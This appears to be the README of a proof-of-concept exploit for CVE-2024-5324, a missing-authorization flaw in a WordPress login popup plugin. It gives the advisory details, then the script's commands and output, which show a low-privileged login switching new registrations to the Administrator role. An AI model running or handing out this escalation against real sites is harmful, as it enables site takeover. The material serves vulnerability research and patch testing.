# CVE-2024-5324
Login/Signup Popup ( Inline Form + Woocommerce ) 2.7.1 - 2.7.2 - Missing Authorization to Arbitrary Options Update

# Description:
The Login/Signup Popup ( Inline Form + Woocommerce ) plugin for WordPress is vulnerable to unauthorized modification of data due to a missing capability check on the 'import_settings' function in versions 2.7.1 to 2.7.2. This makes it possible for authenticated attackers, with Subscriber-level access and above, to change arbitrary options on affected sites. This can be used to enable new user registration and set the default role for new users to Administrator.

```
 Severity: high
 CVE ID: CVE-2024-5324
 CVSS Score: 8.8
 CVSS Metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
 Plugin Slug: easy-login-woocommerce
 WPScan URL: https://www.wpscan.com/plugin/easy-login-woocommerce
 Reference URL: https://www.wordfence.com/threat-intel/vulnerabilities/id/005a27c6-b9eb-466c-b0c3-ce52c25bb321?source=api-prod
```


How to use
---

```
$ python3 CVE-2024-5324.py --url http://wordpress.lan -un test -p test
The plugin version is 2.7.1.
Vulnerability check: http://wordpress.lan
Logged in successfully.
Option set successfully: http://wordpress.lan/wp-admin/admin-ajax.php
You can now register a user on the as a admin.

$ python3 CVE-2024-5324.py --url http://wordpress.lan -un test -p test --fix e
The plugin version is 2.7.1.
Vulnerability check: http://wordpress.lan
Logged in successfully.
Option set successfully: http://wordpress.lan/wp-admin/admin-ajax.php
Options reset to default
```
